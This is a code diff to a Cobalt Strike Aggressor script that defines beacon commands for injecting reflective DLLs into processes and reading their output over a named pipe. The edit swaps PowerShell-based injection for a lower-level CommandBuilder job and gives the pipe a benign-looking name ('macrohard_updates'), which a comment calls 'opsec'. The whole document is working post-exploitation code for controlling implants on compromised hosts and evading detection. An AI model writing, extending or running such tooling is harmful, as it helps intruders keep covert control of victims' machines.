@@ -1,9 +1,11 @@
 # bpsinject($1, 1234, x64, "[System.Diagnostics.Process]::GetCurrentProcess()");
-# powerpick $pipe = New-Object IO.Pipes.NamedPipeClientStream('.', 'my_pipe_1234', [IO.Pipes.PipeDirection]::In); $pipe.Connect(10000); $reader = New-Object IO.StreamReader($pipe); while(($line = $reader.ReadLine()) -ne $null){Write-Output $line}; $reader.Close(); $pipe.Close()
+# powerpick $pipe = New-Object IO.Pipes.NamedPipeClientStream('.', 'macrohard_updates', [IO.Pipes.PipeDirection]::In); $pipe.Connect(10000); $reader = New-Object IO.StreamReader($pipe); while(($line = $reader.ReadLine()) -ne $null){Write-Output $line}; $reader.Close(); $pipe.Close()
+
+import beacon.CommandBuilder;
 
 global('$pipe_wait $pipe_name_generic $pipe_stomp_me_name');
 $pipe_name_generic = "macrohard_updates"; # Change the pipe name an reload the CNA for 'opsec', 28-bytes MAX
-$pipe_wait = "30000"; # Custom timeout
+$pipe_wait = 30000; # Custom timeout
 $pipe_stomp_me_name = "RDLL_PIPE_NAME_NO_CHANGE_PLS";
 
 # $1 - beacon id
@@ -12,7 +14,6 @@ alias rdll-exec {
     local('$barch $beacon_id $pid $rdll_path $rdll $handle $actual_pipe_name $desired_length $null_padding $padding_needed $padded_pipe_name');
     $beacon_id = $1;
     $pid = $2; # Optional pid
-
     # Get current beacon info
     $barch = beacon_info($beacon_id, "barch");
 
@@ -76,9 +77,12 @@ alias rdll-exec {
 # $1 - beacon id
 # $2 - process id of injection target (optional)
 alias rdll-read {
-    local('$barch $beacon_id $pid $cmd');
+    local('$barch $beacon_id $pid $cmd $builder $job_type $callback_type $description $job');
     $beacon_id = $1;
     $pid = $2; # Optional pid
+    $job_type = 40;
+    $callback_type = 32;
+    $description = "pipe read";
 
     # Get current beacon info
     $barch = beacon_info($beacon_id, "barch");
@@ -93,10 +97,16 @@ alias rdll-read {
         $pid = beacon_info($beacon_id, "pid");
     }
 
-    $cmd = "\$pipe = New-Object IO.Pipes.NamedPipeClientStream('.', '" . $pipe_name_generic . "', [IO.Pipes.PipeDirection]::In); \$pipe.Connect(" . $pipe_wait . "); \$reader = New-Object IO.StreamReader(\$pipe); while((\$line = \$reader.ReadLine()) -ne \$null){Write-Output \$line}; \$reader.Close(); \$pipe.Close()";
-
-    # Get output from the pipe
-    bpsinject($beacon_id, $pid, $barch, $cmd);
+    # Use command builder to read from pipe
+    $builder = [new CommandBuilder];
+    [$builder setCommand: $job_type];
+    [$builder addInteger: parseNumber($pid)];
+    [$builder addShort: $callback_type];
+    [$builder addShort: $pipe_wait];
+    [$builder addLengthAndString: "\\\\.\\pipe\\" . $pipe_name_generic];
+    [$builder addLengthAndString: $description];
+    $job = [$builder build];
+    call("beacons.task", $null, $beacon_id, cast($job, 'b'));
 }
 
 # --------------------
